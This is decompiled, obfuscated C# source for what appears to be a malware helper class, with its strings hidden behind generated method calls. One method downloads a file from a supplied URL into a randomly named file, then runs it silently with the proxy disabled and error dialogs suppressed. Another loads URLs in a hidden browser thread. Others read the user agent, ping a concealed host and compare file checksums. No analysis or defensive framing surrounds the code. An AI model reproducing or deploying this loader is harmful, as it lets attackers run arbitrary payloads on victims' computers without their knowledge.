using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns6;

internal class VG
{
	public static Random random_0 = new Random();

	public static string smethod_0()
	{
		IntPtr intPtr = Marshal.AllocHGlobal(255);
		uint uint_ = 255u;
		ObtainUserAgentString(0u, intPtr, ref uint_);
		return Marshal.PtrToStringAnsi(intPtr);
	}

	public static uint smethod_1()
	{
		MapFileAndCheckSum(Class13.string_0, out var _, out var uint_2);
		return uint_2;
	}

	public static bool smethod_2(string string_0, string string_1)
	{
		MapFileAndCheckSum(string_0, out var uint_, out var uint_2);
		if (!MapFileAndCheckSum(string_1, out var uint_3, out var uint_4))
		{
			if (uint_3 == uint_ && uint_4 == uint_2)
			{
				return true;
			}
			return false;
		}
		return false;
	}

	public static byte[] smethod_3(object object_0)
	{
		byte[] array = new byte[0];
		if (object_0 != null && (object)object_0.GetType() == typeof(byte[]))
		{
			return (byte[])object_0;
		}
		try
		{
			int num = Marshal.SizeOf(object_0);
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: false);
			array = new byte[num];
			Marshal.Copy(intPtr, array, 0, num);
			Marshal.FreeHGlobal(intPtr);
			return array;
		}
		catch
		{
			return array;
		}
	}

	public static string smethod_4(int int_0)
	{
		string text = _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_7();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			stringBuilder.Append(text.Substring(random_0.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static void smethod_5(string string_0)
	{
		if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_8()))
		{
			string_0 = _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_8() + string_0;
		}
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				//IL_0000: Unknown result type (might be due to invalid IL or missing references)
				//IL_0006: Expected O, but got Unknown
				//IL_000e: Unknown result type (might be due to invalid IL or missing references)
				//IL_0018: Expected O, but got Unknown
				WebBrowser val = new WebBrowser();
				val.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(smethod_6));
				val.Navigate(new Uri(string_0));
				Application.Run();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}
		catch
		{
		}
	}

	private static void smethod_6(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		if (((WebBrowser)((sender is WebBrowser) ? sender : null)).get_Url() == e.get_Url())
		{
			((Component)(WebBrowser)sender).Dispose();
			Application.ExitThread();
			smethod_9();
		}
	}

	public static bool smethod_7(string string_0)
	{
		if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_8()))
		{
			string_0 = _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_8() + string_0;
		}
		try
		{
			WebClient webClient = new WebClient();
			webClient.Proxy = null;
			WebClient webClient2 = webClient;
			Process process = new Process();
			string text = string_0.Substring(string_0.LastIndexOf('.')).ToLower();
			string text2 = Environment.GetEnvironmentVariable(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_9()) + _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_10() + smethod_4(random_0.Next(5, 12)) + text;
			webClient2.DownloadFile(string_0, text2);
			if (!File.Exists(text2))
			{
				return false;
			}
			process.StartInfo.FileName = text2;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.ErrorDialog = false;
			process.Start();
			process.Dispose();
			webClient2.Dispose();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static uint smethod_8()
	{
		PingReply pingReply = new Ping().Send(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_11(), 1000, new byte[8], new PingOptions
		{
			DontFragment = true
		});
		if (pingReply.Status == IPStatus.Success)
		{
			return (uint)pingReply.RoundtripTime;
		}
		return 999u;
	}

	public static void smethod_9()
	{
		GC.Collect(GC.MaxGeneration);
		GC.WaitForPendingFinalizers();
		if (Environment.OSVersion.Platform == PlatformID.Win32NT)
		{
			SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, (UIntPtr)uint.MaxValue, (UIntPtr)uint.MaxValue);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode)]
	private static extern int SetProcessWorkingSetSize(IntPtr intptr_0, UIntPtr uintptr_0, UIntPtr uintptr_1);

	[DllImport("urlmon", CharSet = CharSet.Ansi)]
	private static extern bool ObtainUserAgentString(uint uint_0, IntPtr J3bk8, ref uint uint_1);

	[DllImport("imagehlp", CharSet = CharSet.Unicode)]
	private static extern bool MapFileAndCheckSum(string string_0, out uint uint_0, out uint uint_1);
}
